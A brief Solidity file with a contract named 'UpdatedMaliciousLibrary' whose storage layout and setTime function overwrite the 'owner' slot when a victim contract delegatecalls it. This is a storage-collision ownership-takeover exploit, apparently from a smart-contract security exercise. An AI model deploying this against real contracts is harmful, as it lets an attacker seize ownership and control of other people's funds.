// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract UpdatedMaliciousLibrary {
    address public empty1;
    address public empty2;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(uint256(_time)));
    }
}